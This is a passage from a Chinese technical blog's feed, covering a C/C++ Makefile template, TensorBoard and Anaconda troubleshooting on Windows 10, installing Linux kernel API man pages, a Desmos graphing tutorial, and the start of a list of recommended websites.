      <url>/archives/f4639d5e.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文并不会介绍<code>Makefile</code>的基础使用方法，不过对于初次接触<code>Makefile</code>的同学们，这里推荐阅读<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L05vdGVzL2Jsb2IvbWFzdGVyLyVFOCVCNyU5RiVFNiU4OCU5MSVFNCVCOCU4MCVFOCVCNSVCNyVFNSU4NiU5OU1ha2VmaWxlL01ha2VmaWxlLnBkZg==" title="https://github.com/ravenxrz/Notes/blob/master/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99Makefile/Makefile.pdf">《跟我一起写Makefile》<i class="fa fa-external-link"></i></span>，全书一共80来页，从Makefile的基础用法到进阶使用都讲解得比较通透。</p><a id="more"></a><p><code>Makefile</code>简介：一个工程中的源文件不计其数，其按类型、功能、模块分别放在若干个目录中，<code>Makefile</code>定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。————–摘自百度百科</p><h2 id="2-C-C-项目Makefile模板"><a href="#2-C-C-项目Makefile模板" class="headerlink" title="2. C/C++项目Makefile模板"></a>2. C/C++项目Makefile模板</h2><p>结合《跟我一起写Makefile》，我常用的Makefile模板如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">CC :&#x3D; gcc</span><br><span class="line"></span><br><span class="line"># CFLAGS</span><br><span class="line">CFLAGS :&#x3D; -g -Wall</span><br><span class="line"></span><br><span class="line"># 库文件存放地址</span><br><span class="line">LIB :&#x3D; -L .&#x2F;lib</span><br><span class="line"></span><br><span class="line"># 链接库</span><br><span class="line">LIB +&#x3D; -lxml2 \</span><br><span class="line">-ljpeg </span><br><span class="line"></span><br><span class="line"># 头文件所在地址</span><br><span class="line">INCLUDE :&#x3D;-I .&#x2F;include&#x2F;   \</span><br><span class="line">-I .&#x2F;</span><br><span class="line"></span><br><span class="line">CSources :&#x3D; $(shell find -name &quot;*.c&quot;)   # 通过find命令，找到所有的.c文件</span><br><span class="line"></span><br><span class="line">Objs :&#x3D; $(CSources:.c&#x3D;.o)</span><br><span class="line"></span><br><span class="line">main :$(Objs)</span><br><span class="line">$(CC) $^ -o $@   $(CFLAGS)  $(LIB)</span><br><span class="line"></span><br><span class="line">%.d : %.c</span><br><span class="line">rm -f $@; \</span><br><span class="line">$(CC) -MM $(INCLUDE) $&lt; &gt; $@.$$$$; \</span><br><span class="line">sed -e &#39;s,^.*:,$*.o $@:,g&#39;  &lt; $@.$$$$ &gt; $@; \</span><br><span class="line">rm -f $@.$$$$</span><br><span class="line"></span><br><span class="line">%.o : %.c</span><br><span class="line">$(CC) -c $(INCLUDE) $&lt; -o $@</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">@echo $(CSources)</span><br><span class="line">rm main $(CSources:.c&#x3D;.d) $(CSources:.c&#x3D;.o)</span><br></pre></td></tr></table></figure><p>这里讲解一下这个模板的几个变量：</p><ul><li><code>CC</code> ：使用的编译器，<code>gcc/g++/arm-linux-gcc</code>等等</li><li><code>CFLAGS</code>: 编译器参数</li><li><code>LIB</code> : 项目中所使用到的各个库</li><li><code>INCLUDE</code>: 项目头文件</li></ul><p>再看看几个代码片段，大多数都是生成中间文件，<code>.o文件</code>。这中间有一串很难看的代码— <code>%.d : %.o</code>下面这一块，但是其实不用管它具体是怎么运行的，<strong>你只用知道它是用于生成各个文件之间的依赖关系</strong>的就行了 （其实关键在于 -MM 参数)，用于辅助编译的。<em>对于爱学习想深究的那些同学们，可以阅读《跟我一起学Makefile》，查看一下生成出来的.d文件，应该也就懂了</em>。</p><p>另外，给一个建议：</p><p>其实很多时候并不需要我们书写<code>Makefile</code>，反而是需要书写<code>gcc</code><strong>编译规则</strong>，比如<strong>添加的头文件在哪儿？代码所需要的库文件在哪儿？又需要链接那些库？</strong>  搞懂<code>gcc</code>编译中常用的参数，直到能够回答上面三个问题，再来书写<code>Makefile</code>就会容易很多了。</p><hr><p><strong>简单回答一下上面三个问题</strong>，具体的实施，需要自己去实际敲代码，用命令编译一下才知道。</p><ol><li><p>找到头文件： <code>gcc</code>编译器中有<code>-I</code>参数，后面跟的路径就是头文件路径。</p></li><li><p>找到库文件：<code>gcc</code>编译器中有<code>-L</code>参数，后面跟的路径就是库文件路径的，当然<code>linux</code>环境下，<code>gcc</code>也会自动到根目录和<code>usr</code>目录下的<code>lib</code>下找库文件。  （库文件包括静态库后缀为<code>.a</code>，动态库后缀为<code>.so</code>，两者的区别在于，前者在编译过程中就一起链接到可运行程序中，造成最终的程序过大，但便于移植。后者则不链接到可运行程序中，而是在运行时到环境中去寻找该库，所以可运行程序较小，但是不便于移植，使用这样的程序就需要自己要安装一些动态库）</p></li><li><p>链接库：光是找到库文件所在地还不够，需要指明需要链接哪些库，gcc编译器中有<code>-l</code>参数，后面跟你要链接的库。需要注意的一点是，linux下的库文件有命名规则，文件开头必须是<code>lib</code>,例如我有一个字体库，那么文件可为<code>libfont.a</code> 或<code>libfont.so</code>，另外我们还可能看见动态文件名后面带数字，如<code>libfont.so.2</code>，这里最后一个数字代表了这个库的版本。</p></li></ol><p>最后再来看一下上文给的模板的上半段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CC :&#x3D; gcc</span><br><span class="line"></span><br><span class="line"># CFLAGS</span><br><span class="line">CFLAGS :&#x3D; -g -Wall</span><br><span class="line"></span><br><span class="line"># 库文件存放地址</span><br><span class="line">LIB :&#x3D; -L .&#x2F;lib</span><br><span class="line"></span><br><span class="line"># 链接库</span><br><span class="line">LIB +&#x3D; -lxml2 \</span><br><span class="line">-ljpeg </span><br><span class="line"></span><br><span class="line"># 头文件所在地址</span><br><span class="line">INCLUDE :&#x3D;-I .&#x2F;include&#x2F;   \</span><br><span class="line">-I .&#x2F;</span><br></pre></td></tr></table></figure><p>这段的意思是，本项目使用gcc编译，编译后的结果可调试(<code>-g</code>)，并且打印编译过程中的所有警告(<code>-Wall</code>)，项目的头文件放在<code>./lib</code>（别忘了<code>gcc</code>还会到根目录和/<code>usr</code>的<code>lib</code>去寻找哦)，在这些库文件中我要链接<code>xml2,jpeg</code>库，头文件放在了<code>./include和./</code>下。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10-TensorBoard使用方式及踩坑日记</title>
      <link href="/archives/b6686206.html"/>
      <url>/archives/b6686206.html</url>
      
        <content type="html"><![CDATA[<p>之前在ubuntu上使用tensorboard还挺顺利的，没想到最近在win10却踩了很久的坑，这里记录一下。</p><a id="more"></a><p>我的<code>python</code>环境如下:</p><ul><li>python 3.5.6</li><li>tensorflow 1.10.0</li></ul><p>这里先说一下如何使用<code>TensorBoard</code>。基本上分两步：</p><ul><li>第一步将你需要保存的计算图输出到日志文件中</li><li>第二步使用<code>TensorBoard</code>生成可视化图形</li></ul><p><strong>Step1：将计算图输出到日志中，这里以两个张量的加法作为例子。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">TensorBoard日志输出</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import tensorflow as tf</span><br><span class="line"></span><br><span class="line"># 定义了一个简单的计算图，实现向量加法的操作</span><br><span class="line">input1 &#x3D; tf.constant([1.0,2.0,3.0],shape&#x3D;[1,3],name&#x3D;&#39;input1&#39;)</span><br><span class="line">input2 &#x3D; tf.Variable(tf.random_normal([1,3]),name&#x3D;&#39;input2&#39;)</span><br><span class="line">output &#x3D; tf.add_n([input1,input2],name&#x3D;&#39;add&#39;)</span><br><span class="line"></span><br><span class="line"># 生成一个写日志的writer。并将当前的TensorFLow计算图写入到日志中。</span><br><span class="line">writer &#x3D; tf.summary.FileWriter(&#39;.&#x2F;log&#39;,tf.get_default_graph())</span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure><p><strong>Step2: 使用TensorBoard程序生成可可视化图形</strong></p><p>在<code>step1</code>中，我使用的路径是相对路径<code>./log</code>，为便于后续说明，先贴上它的绝对路径：<code>D:\Projects\PythonProjects\TensorFlowLearning\google_tensorflow_practise\chapter9\log</code></p><p>。之后找到<code>TensorBoard</code>程序所在地（可以使用<strong>Everything</strong>软件来搜索），如下图:</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5ea451253d178d9d42b.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbb790451253d178d9ec24.png" alt="在这里插入图片描述"><br>然后在这里打开你的打开<code>power shell</code>或者<code>cmd</code>或者<code>cmder</code>窗口（笔者这里使用的是<code>cmder</code>，三个都可以）。<br><code>shift</code> + 鼠标右键可选择<code>power shell</code>。</p><p>执行<code>tensorboard.exe --logdir=D:\Projects\PythonProjects\TensorFlowLearning\google_tensorflow_practise\chapter9\log</code>，将<code>logdir</code>后面的路径替换为你的绝对路径即可。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb7a0451253d178d9ed2b.png" alt="在这里插入图片描述"><br><strong>注意上图是失败的</strong>，如果你能看到类似下图，<strong>含有个网址的结果那就是成功的</strong>，之后把地址贴到浏览器就好了，然后就可以溜啦，不要浪费时间在阅读后面的文章了。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb7a9451253d178d9edd8.png" alt="在这里插入图片描述"><br>如果你和我一样不幸，出现了类似<code>Unable to create process using .....</code>的结果，那么这里给出几种解决方案。</p><p><strong>solution 1: 我的解决方案</strong></p><p>首先确定你用得<code>python</code>解释器是多少，如果你用的<code>pycharm</code>的话，可如下图来确定：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb7a9451253d178d9edd8.png" alt="在这里插入图片描述"><br>可以看到，我的解释器是<code>3.5</code>，确定了这个以后就按照它给的路径去文件管理器下找到<code>python.exe</code>程序:</p><p><img data-src="https://pic.superbed.cn/item/5cfbb7b2451253d178d9ee5b.png" alt="在这里插入图片描述"><br>另外找到之前<code>tensorboard.exe</code>程序所在地,但是这次我们关注的不是<code>tensorboard.exe</code>，而是<code>tensorboard-script.py</code>文件：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb7c4451253d178d9ef65.png" alt="在这里插入图片描述"><br>ok，只要确定了这两个，打开<code>power shell</code>或者其他命令窗口。按照</p><p><code> python.exe路径 tensorboard-script.py路径 --logdir=生成的日志目录路径</code>的结构去执行命令（<strong>将每个程序拖入到命令窗口就好了，不用手敲的</strong>）</p><p>现在，你是否能得到下图结果呢？</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb7d2451253d178d9f05e.png" alt="在这里插入图片描述"><br><strong>solution 2: google出来的解决方案</strong></p><p>执行以下命令:</p><p><code>python.exe -m tensorflow.tensorboard --logdir=日志路径</code></p><p>注意<code>python.exe</code>依然是要对应你的解释器的。</p><p>不过笔者用这个命令的时候出现了<code>No module named tensorflow.tensorboard</code>的错误。</p><p><strong>solution 3: github 上的解决方案</strong></p><p><img data-src="https://pic.superbed.cn/item/5cfbb7da451253d178d9f0e1.png" alt="在这里插入图片描述"><br>这里贴出原文网址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlbnNvcmZsb3cvdGVuc29yZmxvdy9pc3N1ZXMvMTAwMTc=" title="https://github.com/tensorflow/tensorflow/issues/10017">https://github.com/tensorflow/tensorflow/issues/10017<i class="fa fa-external-link"></i></span><br>如果上面2种方式你都没解决这个问题，可以尝试使用这个的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">backup the tensorboard.exe</span><br><span class="line">open tensorboard.exe with 010 Editor,I use this</span><br><span class="line">search &quot;python.exe&quot;</span><br><span class="line">change all the ascil code between #! and python.exe to 20(whitespace)</span><br><span class="line">change the quotation marks after python.exe to whitespace</span><br><span class="line">In my computer:</span><br><span class="line">before:</span><br><span class="line">#!&quot;c:\program files\python35\python.exe&quot;</span><br><span class="line">after:</span><br><span class="line">#!　　　　　　　　　　　　　　　python.exe</span><br></pre></td></tr></table></figure><p>如果你能成功的话，把生成的网址贴到浏览器就好啦。可以得到类似下图的结果：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb7ef451253d178d9f258.png" alt="在这里插入图片描述"></p><p>嗯，好了。希望你能够解决你的问题咯。</p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TensorBoard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10上使用Anaconda命令行安装包报SSLERROR的解决办法</title>
      <link href="/archives/b0f3833b.html"/>
      <url>/archives/b0f3833b.html</url>
      
        <content type="html"><![CDATA[<a id="more"></a><blockquote><p>最近在使用<code>conda</code>命令安装<code>pytorch</code>的时候总是出现<code>像SSL ERROR，ConnectTimeoutError</code>等等。<code>google</code>了一番，试过好多种方法都不行。</p></blockquote><p><strong>最后发现使用Win系统下安装好的Anaconda Prompt来安装包就好了。</strong><br>如下：<br><img data-src="https://pic2.superbed.cn/item/5cfbb5a4451253d178d9cb4b.png" alt="在这里插入图片描述"></p><p>最后可以成功安装了：<br><img data-src="https://pic.superbed.cn/item/5cfbb5a5451253d178d9cb7b.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> Anaconda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核学习踩坑日记-为你的主机加上Linux内核APi手册</title>
      <link href="/archives/a5232e28.html"/>
      <url>/archives/a5232e28.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>初入Linux内核世界，和在应用层面编程的感觉大不相同，没有好用IDE, 还要阅读大量复杂的linux源码。想着至少要有个Linux Kernel 的APi吧，不然编程真的好难受，所以就有了这篇文章。</p></blockquote><p>经过一番百度，安装内核的<code>Api</code>大多数需要在Linux源码根目录下执行<code>make mandocs</code>命令，大多数情况下都能执行成功，但是我就是这么不幸地被提示没有<code>mandocs</code>这个目标可生成。。<strong>经过一番百度，无果。</strong><br>想着会不会是我的Linux版本太高，所以不行（当时使用的版本是<code>4.15.x</code>)。更换为<code>3.x</code>的内核以后，确实能够生成了，但是不知道是不是我的脸比较黑，<code>3.x</code>的内核对<code>Ubuntu18</code>的支持不大友好，鼠标移动时光标乱晃，而且很卡，所以没办法又从找了个<code>4.14</code>的内核，还是没有。最后更换为了<code>4.9.x</code>的内核，终于能够生成。</p><a id="more"></a><p>如何检测自己的<code>Linux</code>版本能不能生成<code>mandocs</code>呢？</p><p>其实可以在<code>Linux</code>源码路径下执行<code>make help</code>命令，如果看到:</p><p><img data-src="https://pic3.superbed.cn/item/5cfbae96451253d178d962ea.png" alt="在这里插入图片描述"><br>就是可以生成（该截图来自内核4.9.x)。<br><strong>否则，就需要更换内核</strong>。</p><h1 id="OK，废话了这么多。来说一下怎么安装："><a href="#OK，废话了这么多。来说一下怎么安装：" class="headerlink" title="OK，废话了这么多。来说一下怎么安装："></a>OK，废话了这么多。来说一下怎么安装：</h1><p><strong>step1:</strong> 用上文提到的<code>make help</code>命令，确定自己的<code>linux</code>内核可以生成<code>mandocs</code></p><p><strong>step2:</strong> 安装xmlto：<code>sudo apt install xmlto</code></p><p><strong>step3:</strong> 到源码路径下面执行<code>make mandocs</code> 需要等一段时间</p><p><strong>step4:</strong> 安装mandocs: <code>sudo make installmandocs</code> 继续等待一段时间..</p><p>如果以上你都成功了，那么在<code>/usr/local/man</code>路径下应该有一个<code>man9</code>的目录，如下图。</p><p><img data-src="https://pic.superbed.cn/item/5cfbae9c451253d178d96361.png" alt="在这里插入图片描述"></p><p>执行 <code>man kmalloc</code>看下安装成功没，如果是下图，那么恭喜你，你可以溜了。</p><p><img data-src="https://pic.superbed.cn/item/5cfbae9d451253d178d96395.png" alt="在这里插入图片描述"></p><p>然而我就是这么脸黑，经历过更换多个内核，好不容易把<code>mandocs</code>安装成功了，但是使用<code>man kmalloc</code>的时候，<strong>显示出来的却是一片空白</strong>，甚至连普通的<code>ls,find</code>等指令全都不见了。经过一波<code>google</code>，终于找到了解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apparmor-utils</span><br><span class="line"></span><br><span class="line">sudo aa-disable &#x2F;usr&#x2F;bin&#x2F;man</span><br></pre></td></tr></table></figure><p>这应该是<code>ubuntu</code>更新后的一个<code>bug</code>。不过所幸有解决方案。</p><p>至此，你就可以使用man命令查<code>Kernel</code>的<code>api</code>啦。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好玩的数学网站-Desmos</title>
      <link href="/archives/27d14722.html"/>
      <url>/archives/27d14722.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>笔者是个比较喜欢尝试新东西的人，最近找到一个好玩又好用的数学绘图网站。可用于数值计算，函数绘图（支持动态函数），几何绘图等等。在数学建模，论文函数绘制，动态展示函数变化等等方面可能会用到。所以，就来介绍一下这个网站。</p><a id="more"></a><h2 id="2-使用介绍"><a href="#2-使用介绍" class="headerlink" title="2. 使用介绍"></a>2. 使用介绍</h2><p>首先当然是贴出它的官网了：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVzbW9zLmNvbS8=" title="https://www.desmos.com/">https://www.desmos.com/<i class="fa fa-external-link"></i></span></p><p><img data-src="https://pic3.superbed.cn/item/5cfbad1a451253d178d94d0d.jpg" alt="官网"></p><p>点击<strong>Start Graphing</strong>就可以开始了，<em>下面几个蓝色按钮是它的几个子功能，不用太关注</em>。</p><h3 id="2-1-主界面功能介绍"><a href="#2-1-主界面功能介绍" class="headerlink" title="2.1 主界面功能介绍"></a>2.1 主界面功能介绍</h3><p><img data-src="https://pic3.superbed.cn/item/5cfbad1e451253d178d94d57.jpg" alt="主界面"></p><p>主要关注左边的空白区域，因为后续的操作几乎都是围绕着这片区域来完成。除此之外，可通过<strong>分享按钮来下载你绘制好的图像</strong>，<strong>问号按钮有相关的入门教程</strong>（视频教程在youtube上，所以可能需要到科学上网）。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad24451253d178d94dd0.jpg" alt="侧边栏"></p><p>点击侧边栏，可以看到该网站给我们很多模板，我们可以随便点击一个来看看效果，这里我打开了一个四阶多项式拟合：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad26451253d178d94e10.jpg" alt="拟合"></p><p>左边是整个绘制的核心。</p><p>首先是输入了散点的<code>x，y</code>坐标，然后第二栏中输入要拟合的表达式，在<code>desmos</code>中，**~<strong>代表回归拟合的意思，拟合的参数有<code>a,b,c,d,f</code>。输入完成后，它会</strong>自动拟合并绘制图图像，然后将各参数显示出来。**</p><h3 id="2-2-基本功能入门"><a href="#2-2-基本功能入门" class="headerlink" title="2.2 基本功能入门"></a>2.2 基本功能入门</h3><h4 id="2-2-1-基本函数绘制与计算"><a href="#2-2-1-基本函数绘制与计算" class="headerlink" title="2.2.1 基本函数绘制与计算"></a>2.2.1 基本函数绘制与计算</h4><p>新建一个绘图板。在第一栏中输入$f(x) = sin(x)$。可以得到下图:</p><p><img data-src="https://pic2.superbed.cn/item/5cfbad28451253d178d94e4a.jpg" alt="sin函数"></p><p>如何获取函数在某点的值呢？有三种方式:</p><ul><li><p>鼠标点击图形获取，这个最简单，但是也最不精确。</p></li><li><p>通过子栏输入获取：</p></li></ul><p><img data-src="https://pic.superbed.cn/item/5cfbad2b451253d178d94e8a.jpg" alt="子栏获取"></p><ul><li>转换为表格获取，点击坐标面板的设置按钮，点击<strong>convert to table</strong>。得到下图:</li></ul><p><img data-src="https://pic3.superbed.cn/item/5cfbad2c451253d178d94ec5.jpg" alt="转换表格获取"></p><p>  可在x轴中的任意位置插入<code>x</code>的值，它会自动给出结果。如我要知道$x=pi，f(x)$等于多少。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad2d451253d178d94f03.jpg" alt="pi值对应f(x)"></p><p>另外，也可以增加列（增加其他函数），得到相同x值下的不同函数值:</p><p><img data-src="https://pic3.superbed.cn/item/5cfbad2f451253d178d94f3b.jpg" alt="增加列"></p><p>在得到不同的函数值的同时，也得到了增加的函数的散点图。如何修改绘图样式呢？长按$cos(x)$左边绿色的图标，得到下图：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad32451253d178d94f7e.jpg" alt="颜色更改"></p><p>这里可以修改样式和颜色，具体的效果可以自己的尝试，我这里就把线也加上吧。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad34451253d178d94fb9.jpg" alt="更改样式"></p><p><strong>额外补充一点，该网站支持的函数集合可通过下图查看</strong>：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbad37451253d178d94ffe.jpg" alt="支持函数"></p><h4 id="2-2-2-文件夹"><a href="#2-2-2-文件夹" class="headerlink" title="2.2.2 文件夹"></a>2.2.2 文件夹</h4><p>当要绘制多个图形时，我们需要一种方式来管理多个图。好在<code>desmos</code>提供了文件夹管理方式，我们可以通过文件夹来一键隐藏/显示多个函数。使用方式如下:</p><ol><li>点击左上角的+号，新建一个文件夹</li><li>书写任意表达式，通过拖拽的方式把书写的表达式放进文件夹中。</li><li>点击文件夹坐标的图标就可以实现多个图形的同时隐藏和显示了</li></ol><h4 id="2-2-3-列表"><a href="#2-2-3-列表" class="headerlink" title="2.2.3 列表"></a>2.2.3 列表</h4><p>在<code>desmos</code>中，可定义列表来表达多个图形，定义方式如下:</p><p><code>a = [1,2,3]</code></p><p>也可以通过步长来定义</p><p><code>a = [1...10]</code> 默认步长1</p><p>或者<code>a=[0,5...100]</code>推导出步长为5</p><p>然后可以像下图这样使用：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbad3a451253d178d95058.jpg" alt="列表使用1"></p><p>或者也可以同时画多个点：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad3d451253d178d95096.jpg" alt="列表使用2"></p><h4 id="2-2-4-滑动变量（slider"><a href="#2-2-4-滑动变量（slider" class="headerlink" title="2.2.4 滑动变量（slider)"></a>2.2.4 滑动变量（slider)</h4><p>在<code>desmos</code>中可定义滑动变量来绘制动态图像。</p><p>定义一个滑动变量很简单，只要记住一个规则：不要使用常用数学符号,<code>x,y,t,r</code>等。然后再书写表达式desmos会自动提示是否生成滑动变量。如：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad43451253d178d95110.jpg" alt="slider变量"></p><p>通过滑动滑杆或者点击播放，右侧的绘图区会绘制出动态图。（提示：点击播放后右侧有调速滑杆）。</p><p>下面展示一个高级点的：</p><p><img data-src="https://raw.githubusercontent.com/ravenxrz/BlogPic/master/img/007LxXtnly1g2ofycr6udg311s0jjk3z.gif" alt="动态切线"></p><p>是不是感觉很好玩勒。</p><h4 id="2-2-5-参数方程与极坐标"><a href="#2-2-5-参数方程与极坐标" class="headerlink" title="2.2.5 参数方程与极坐标"></a>2.2.5 参数方程与极坐标</h4><p><code>desmos</code>也是支持参数方程，例如我们利用参数方程绘制一个圆形:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad45451253d178d95147.jpg" alt="绘制圆"></p><p>再看看极坐标</p><p>在<code>desmos</code>中，极坐标以符号r和$\theta$表示，画个四叶草？？？</p><p><img data-src="https://pic1.superbed.cn/item/5cfbad4b451253d178d951a6.jpg" alt="四叶草"></p><p>相当简单是吧。</p><h4 id="2-2-6-不等式"><a href="#2-2-6-不等式" class="headerlink" title="2.2.6 不等式"></a>2.2.6 不等式</h4><p>讲解不等式之前，先说说如何在<code>desmos</code>中限制定义域或者值域。通过在大括号{}之间添加限制条件即可。如下:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad4d451253d178d951ef.jpg" alt="范围限制"></p><p>OK,知道了这一点，咱们再来看看使用不等式的使用方式。假设我要绘制一个这样的图形:</p><p>$$<br>\left\{<br>\begin{array}{c}<br>x \lt 2    \\<br>0 \lt y \lt x -1<br>\end{array}<br>\right.<br>$$</p><p>那么这样写就画出来啦。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad51451253d178d9523c.jpg" alt="不等式绘制"></p><p>(ps:高中的时候有一类求解极大极小值就是需要画图来做吧)</p><h4 id="2-2-7-积分"><a href="#2-2-7-积分" class="headerlink" title="2.2.7 积分"></a>2.2.7 积分</h4><p><code>desmos</code>支持积分计算，也支持变上（下）限函数。通过输入<code>int</code>自动添加积分符号，如：</p><p><img data-src="https://pic.superbed.cn/item/5cfbad58451253d178d952cf.jpg" alt="积分计算"></p><h2 id="3-结语"><a href="#3-结语" class="headerlink" title="3. 结语"></a>3. 结语</h2><p>嗯，<code>desmos</code>的基础入门就这样了吧，还有很多高级用法可以阅读它提供的模板和文档，当然也可观看<code>desmos</code>的官方教程。笔者觉得蛮好玩的就学习了一下，希望能够对你有所帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Desmos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这些年，我所用过的精品软件（网站干货篇)</title>
      <link href="/archives/b1ec495.html"/>
      <url>/archives/b1ec495.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>闲来无聊，不想学新东西，也不知道干什么。就来分享一波干货网站吧。</p><p>这里做了一个小系列：<br><a href="https://www.ravenxrz.ink/archives/5cb17766.html">这些年，我所用过精品Chrome插件（插件干货篇）</a><br><a href="https://www.ravenxrz.ink/archives/a014e5e9.html">这些年，我所用过精品软件（PC干货篇）</a><br><a href="https://www.ravenxrz.ink/archives/b1ec495.html">这些年，我所用精品网站（网站干货篇）</a></p><a id="more"></a><h2 id="2-一大波干货网站分享"><a href="#2-一大波干货网站分享" class="headerlink" title="2. 一大波干货网站分享"></a>2. 一大波干货网站分享</h2><p><strong>网盘资源站点：</strong></p><p>网盘搜索：<span class="exturl" data-url="aHR0cDovL3RhbnN1bzIzMy5jb20v" title="http://tansuo233.com/">http://tansuo233.com/<i class="fa fa-external-link"></i></span></p><p>盘多多：<span class="exturl" data-url="aHR0cDovL3d3dy5wYW5kdW9kdW8ubmV0Lw==" title="http://www.panduoduo.net/">http://www.panduoduo.net/<i class="fa fa-external-link"></i></span></p><p>云搜：<span class="exturl" data-url="aHR0cDovL3d3dy5kYXlzb3UuY29tLw==" title="http://www.daysou.com/">http://www.daysou.com/<i class="fa fa-external-link"></i></span></p><p>胖次搜索：<span class="exturl" data-url="aHR0cHM6Ly93d3cucGFuYy5jYy8=" title="https://www.panc.cc/">https://www.panc.cc/<i class="fa fa-external-link"></i></span></p><hr><p><strong>配色：</strong></p><p>adobe color：<span class="exturl" data-url="aHR0cHM6Ly9jb2xvci5hZG9iZS5jb20vemgvZXhwbG9yZS9uZXdlc3Qv" title="https://color.adobe.com/zh/explore/newest/">https://color.adobe.com/zh/explore/newest/<i class="fa fa-external-link"></i></span></p><p>colors:<span class="exturl" data-url="aHR0cHM6Ly9jb29sb3JzLmNvLw==" title="https://coolors.co/">https://coolors.co/<i class="fa fa-external-link"></i></span></p><p>MD Design:<span class="exturl" data-url="aHR0cHM6Ly9tYXRlcmlhbC5pby9kZXNpZ24vY29sb3IvI2NvbG9yLWNvbG9yLXBhbGV0dGU=" title="https://material.io/design/color/#color-color-palette">https://material.io/design/color/#color-color-palette<i class="fa fa-external-link"></i></span></p><p>​              <span class="exturl" data-url="aHR0cHM6Ly93d3cubWF0ZXJpYWx1aS5jby9jb2xvcnM=" title="https://www.materialui.co/colors">https://www.materialui.co/colors<i class="fa 